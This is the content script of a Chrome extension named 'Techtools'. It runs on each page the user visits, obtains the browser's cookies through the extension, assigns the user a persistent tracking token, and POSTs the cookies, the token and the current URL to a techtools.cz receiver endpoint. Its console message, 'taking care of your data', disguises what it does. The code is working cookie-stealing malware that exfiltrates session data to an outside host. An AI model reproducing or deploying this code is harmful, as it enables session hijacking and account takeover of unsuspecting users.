// Function to generate a unique token
function generateToken() {
  return 'user_' + Math.random().toString(36).substr(2) + Date.now().toString(36);
}

chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
  console.log('Techtools is taking care of your data!');

  // Check for an existing token
  chrome.storage.local.get(['userToken'], function(result) {
    let userToken = result.userToken;
    const currentUrl = window.location.href;

    if (!userToken) {
      // If token doesn't exist, generate and save a new one
      userToken = generateToken();
      chrome.storage.local.set({userToken: userToken}, function() {
        console.log("New token generated and saved.");
      });
    }

    // Now that we have a token, send the data with the token
    fetch('https://techtools.cz/extension/receiver', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "data": response.cookies,
        "token_identifier": userToken, // Include the token in the request
        "url_send_from": currentUrl
      })
    })
    .then(response => {
      if (!response.ok) throw new Error('Network response was not ok');
      return response.json();
    })
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
  });
});
